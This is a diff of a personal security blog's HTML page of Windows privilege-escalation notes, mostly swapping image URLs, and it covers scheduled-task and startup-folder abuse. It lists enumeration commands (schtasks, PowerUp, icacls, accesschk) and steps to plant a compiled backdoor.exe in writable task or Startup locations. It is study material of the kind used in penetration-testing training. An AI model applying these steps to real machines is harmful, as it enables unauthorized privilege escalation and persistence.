+<h5 id="Powershell-5"><a href="#Powershell-5" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>$schdule=new-object -com(&#39;Schedule.Service&#39;); $schdule.connect(); $tasks=$schdule.getfolder(&#39;\&#39;).gettasks(0); $tasks | fl</code><br><img src="/img/2020/privilege-escalation-note/JTNQBOK.png" alt=""></p>
+<h5 id="Powershell-PowerUp-6"><a href="#Powershell-PowerUp-6" class="headerlink" title="Powershell (PowerUp)"></a>Powershell (PowerUp)</h5><p><code>Get-ModifiableScheduledTaskFile</code> (| select )<br><img src="/img/2020/privilege-escalation-note/h7uNhOi.png" alt=""></p>
+<h5 id="cmd-5"><a href="#cmd-5" class="headerlink" title="cmd"></a>cmd</h5><p><code>schtasks /query /TN &lt;task name&gt; /xml</code><br><img src="/img/2020/privilege-escalation-note/oF9kRWh.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/pMOZDpG.png" alt=""></p>
+<h5 id="autoruns-sysinternals"><a href="#autoruns-sysinternals" class="headerlink" title="autoruns (sysinternals)"></a>autoruns (sysinternals)</h5><p><img src="/img/2020/privilege-escalation-note/bcO80eV.png" alt=""></p>
 <h4 id="Exploitation-9"><a href="#Exploitation-9" class="headerlink" title="Exploitation"></a>Exploitation</h4><ol>
 <li>Compile a backdoor.exe </li>
 <li>rename and place(overwirte) the file in identified location</li>
 </ol>
-<p><img src="https://i.imgur.com/HGp9TiK.png" alt=""><br>or<br><img src="https://i.imgur.com/72ySPqk.png" alt=""></p>
-<p><img src="https://i.imgur.com/WaIWrlP.png" alt=""></p>
-<p>check path permission<br><img src="https://i.imgur.com/9KzunIz.png" alt=""></p>
-<p>put the backdoor<br><img src="https://i.imgur.com/SkgQj06.png" alt=""><br>restart the computer<br><img src="https://i.imgur.com/3JhqbH4.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/HGp9TiK.png" alt=""><br>or<br><img src="/img/2020/privilege-escalation-note/72ySPqk.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/WaIWrlP.png" alt=""></p>
+<p>check path permission<br><img src="/img/2020/privilege-escalation-note/9KzunIz.png" alt=""></p>
+<p>put the backdoor<br><img src="/img/2020/privilege-escalation-note/SkgQj06.png" alt=""><br>restart the computer<br><img src="/img/2020/privilege-escalation-note/3JhqbH4.png" alt=""></p>
 <h2 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h2><p>Have to wait for admin login to start the program.</p>
 <h3 id="Binary-overwirte-put"><a href="#Binary-overwirte-put" class="headerlink" title="Binary overwirte(put)"></a>Binary overwirte(put)</h3><ul>
 <li>For a singel user on specific computer:<br><code>c:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
 <li>For all user on specific computer:<br><code>c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
 </ul>
-<h4 id="Detection-9"><a href="#Detection-9" class="headerlink" title="Detection"></a>Detection</h4><h5 id="cmd-icacls"><a href="#cmd-icacls" class="headerlink" title="cmd (icacls)"></a>cmd (icacls)</h5><p><code>icacls &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</code><br><img src="https://i.imgur.com/BBLvnBj.png" alt=""></p>
-<h5 id="Powershell-6"><a href="#Powershell-6" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-Acl &#39;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#39;</code><br><img src="https://i.imgur.com/QDn1QKy.png" alt=""></p>
-<h5 id="accesschk-3"><a href="#accesschk-3" class="headerlink" title="accesschk"></a>accesschk</h5><p><code>accesschk.exe /accepteula -uv &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</code><br><img src="https://i.imgur.com/WMvKuFk.png" alt=""></p>
+<h4 id="Detection-9"><a href="#Detection-9" class="headerlink" title="Detection"></a>Detection</h4><h5 id="cmd-icacls"><a href="#cmd-icacls" class="headerlink" title="cmd (icacls)"></a>cmd (icacls)</h5><p><code>icacls &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</code><br><img src="/img/2020/privilege-escalation-note/BBLvnBj.png" alt=""></p>
+<h5 id="Powershell-6"><a href="#Powershell-6" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-Acl &#39;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#39;</code><br><img src="/img/2020/privilege-escalation-note/QDn1QKy.png" alt=""></p>
+<h5 id="accesschk-3"><a href="#accesschk-3" class="headerlink" title="accesschk"></a>accesschk</h5><p><code>accesschk.exe /accepteula -uv &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</code><br><img src="/img/2020/privilege-escalation-note/WMvKuFk.png" alt=""></p>
 <h4 id="Exploitation-10"><a href="#Exploitation-10" class="headerlink" title="Exploitation"></a>Exploitation</h4><ol>
 <li>Compile a backdoor.exe </li>
 <li>rename and place(overwirte) the file in identified location</li>
@@ -511,7 +511,7 @@ Detection (Get HotFix information)powershell">
 
                     
                 </ul>
-                <p class="copyright text-muted">&copy; 2023 AStar<br></p>
+                <p class="copyright text-muted">&copy; 2024 AStar<br></p>
                 <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                 <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
             </div>
